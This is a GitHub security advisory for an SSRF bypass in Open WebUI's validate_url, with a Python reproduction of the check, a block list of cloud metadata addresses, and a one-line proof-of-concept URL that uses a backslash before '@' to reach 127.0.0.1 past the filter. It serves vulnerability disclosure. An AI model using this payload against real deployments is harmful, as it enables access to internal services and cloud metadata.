# [H] Open WebUI has a Server-Side Request Forgery (SSRF) bypass in `validate_url`

## Summary
Severity: High
Advisory: GHSA-8w7q-q5jp-jvgx
CVE: CVE-2026-45400
CWE: CWE-918
Ecosystem: PyPI
CVSS: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:L/A:N (CVSS_V3)
Published: 2026-05-14
Source: https://github.com/advisories/GHSA-8w7q-q5jp-jvgx
Type: github-advisory

## Affected
- PyPI: `open-webui` — affected >=0 <0.9.5

## Details
### Summary
In the open-webui project, a parsing difference between the urlparse and requests libraries led to an SSRF bypass vulnerability.

### Details
In the current project, URL validation is performed using the function validate_url.

<img width="1323" height="1145" alt="QQ20260322-202854-22-1" src="https://github.com/user-attachments/assets/896d19f2-c7c3-499a-9052-12aea756ac47" />

The current checking logic uses urlparse to parse the hostname part of the URL for verification.

<img width="1122" height="429" alt="QQ20260322-203014-22-2" src="https://github.com/user-attachments/assets/653520e9-e311-4a5e-8345-a2446e217d88" />

However, there are actually differences in parsing between urlparse and the library that actually sends the request. For example, in files.py, validate_url is used first for URL validation, and then requests.get is used to send the request.

<img width="1269" height="915" alt="QQ20260322-203122-22-3" src="https://github.com/user-attachments/assets/f200aa06-9190-425e-9659-1ecaf95f806b" />

The core issue: `urlparse()` and `requests` disagree on which host a URL like `http://127.0.0.1:6666\@1.1.1.1` points to:

- `urlparse()` treats `\` as a regular character and `@` as the userinfo-host delimiter, so it extracts hostname as `1.1.1.1` (public)
- `requests` treats `\` as a path character, connecting to `127.0.0.1` (internal)

Below is a test code I wrote following the open-webui code.
```
from __future__ import annotations

import ipaddress
import logging
import os
import socket
import urllib.parse
import urllib.request
from typing import Optional, Sequence, Union
import requests

log = logging.getLogger(__name__)

# Same text as open_webui.constants.ERROR_MESSAGES.INVALID_URL
INVALID_URL = (
    "Oops! The URL you provided is invalid. Please double-check and try again."
)

# Same semantics as open_webui.config (ENABLE_RAG_LOCAL_WEB_FETCH / WEB_FETCH_FILTER_LIST)
ENABLE_RAG_LOCAL_WEB_FETCH = (
    os.getenv("ENABLE_RAG_LOCAL_WEB_FETCH", "False").lower() == "true"
)

_DEFAULT_WEB_FETCH_FILTER_LIST = [
    "!169.254.169.254",
    "!fd00:ec2::254",
    "!metadata.google.internal",
    "!metadata.azure.com",
    "!100.100.100.200",
]
_web_fetch_filter_env = os.getenv("WEB_FETCH_FILTER_LIST", "")
if _web_fetch_filter_env == "":
    _web_fetch_filter_env_list: list[str] = []
else:
    _web_fetch_filter_env_list = [
        item.strip()
        for item in _web_fetch_filter_env.split(",")
        if item.strip()
    ]
WEB_FETCH_FILTER_LIST = list(
    set(_DEFAULT_WEB_FETCH_FILTER_LIST + _web_fetch_filter_env_list)
)


def get_allow_block_lists(filter_list):
    allow_list = []
    block_list = []

    if filter_list:
        for d in filter_list:
            if d.startswith("!"):
                block_list.append(d[1:].strip())
            else:
                allow_list.append(d.strip())

    return allow_list, block_list


def is_string_allowed(
    string: Union[str, Sequence[str]], filter_list: Optional[list[str]] = None
) -> bool:
    if not filter_list:
        return True

    allow_list, block_list = get_allow_block_lists(filter_list)
    strings = [string] if isinstance(string, str) else list(string)

    if allow_list:
        if not any(s.endswith(allowed) for s in strings for allowed in allow_list):
            return False

    if any(s.endswith(blocked) for s in strings for blocked in block_list):
        return False

    return True


def resolve_hostname(hostname):
    # Get address information
    addr_info = socket.getaddrinfo(hostname, None)

    # Extract IP addresses from address information
    ipv4_addresses = [info[4][0] for info in addr_info if info[0] == socket.AF_INET]
    ipv6_addresses = [info[4][0] for info in addr_info if info[0] == socket.AF_INET6]

    return ipv4_addresses, ipv6_addresses


def _validators_url_accept(url: str) -> bool:
    """
    Stand-in for python-validators url(): True if string looks like http(s) URL with host.
    """
    try:
        u = url.strip()
        if not u:
            return False
        p = urllib.parse.urlparse(u)
        if p.scheme not in ("http", "https"):
            return False
        if not p.netloc:
            return False
        return True
    except Exception:
        return False


def _ipv4_private(ip: str) -> bool:
    try:
        a = ipaddress.ip_address(ip)
        return a.version == 4 and a.is_private
    except ValueError:
        return False


def _ipv6_private(ip: str) -> bool:
    try:
        a = ipaddress.ip_address(ip)
        return a.version == 6 and a.is_private
    except ValueError:
        return False


def validate_url(url: Union[str, Sequence[str]]):
    if isinstance(url, str):
        if not _validators_url_accept(url):
            raise ValueError(INVALID_URL)

        parsed_url = urllib.parse.urlparse(url)

        # Protocol validation - only allow http/https
        if parsed_url.scheme not in ["http", "https"]:
            log.warning(
                f"Blocked non-HTTP(S) protocol: {parsed_url.scheme} in URL: {url}"
            )
            raise ValueError(INVALID_URL)

        # Blocklist check using unified filtering logic
        if WEB_FETCH_FILTER_LIST:
            if not is_string_allowed(url, WEB_FETCH_FILTER_LIST):
                log.warning(f"URL blocked by filter list: {url}")
                raise ValueError(INVALID_URL)

        if not ENABLE_RAG_LOCAL_WEB_FETCH:
            # Local web fetch is disabled, filter out any URLs that resolve to private IP addresses
            parsed_url = urllib.parse.urlparse(url)
            # Get IPv4 and IPv6 addresses
            ipv4_addresses, ipv6_addresses = resolve_hostname(parsed_url.hostname)
            # Check if any of the resolved addresses are private
            # This is technically still vulnerable to DNS rebinding attacks, as we don't control WebBaseLoader
            for ip in ipv4_addresses:
                if _ipv4_private(ip):
                    raise ValueError(INVALID_URL)
            for ip in ipv6_addresses:
                if _ipv6_private(ip):
                    raise ValueError(INVALID_URL)
        return True
    elif isinstance(url, Sequence):
        return all(validate_url(u) for u in url)
    else:
        return False

if __name__ == "__main__":
    logging.basicConfig(level=logging.INFO)
    # url = "https://127.0.0.1:6666\@1.1.1.1"
    url = "https://127.0.0.1:6666"
    validate_url(url)
    response = requests.get(url)
    print(response.text)

```
As you can see, the current check on 127.0.0.1:6666 successfully identified it as an internal network IP and blocked it.

<img width="1428" height="273" alt="QQ20260322-203503-22-4" src="https://github.com/user-attachments/assets/cf29b639-d4fe-409e-a516-2424d608739f" />

However, for https://127.0.0.1:6666\@1.1.1.1/, the hostname extracted by validate_url is 1.1.1.1, which is considered a public IP address and therefore passes validation. In reality, this URL is being used to request the internal IP address 127.0.0.1:6666, resulting in an SSRF bypass.

<img width="2255" height="786" alt="QQ20260322-203750-22-5" src="https://github.com/user-attachments/assets/050bc6a4-760f-4d7a-8b52-056778097cd1" />

### PoC
```
http://127.0.0.1:6666\@baidu.com
```

### Impact
SSRF

## References
- https://github.com/open-webui/open-webui/security/advisories/GHSA-8w7q-q5jp-jvgx
- https://nvd.nist.gov/vuln/detail/CVE-2026-45400
- https://github.com/open-webui/open-webui
- https://github.com/open-webui/open-webui/releases/tag/v0.9.0
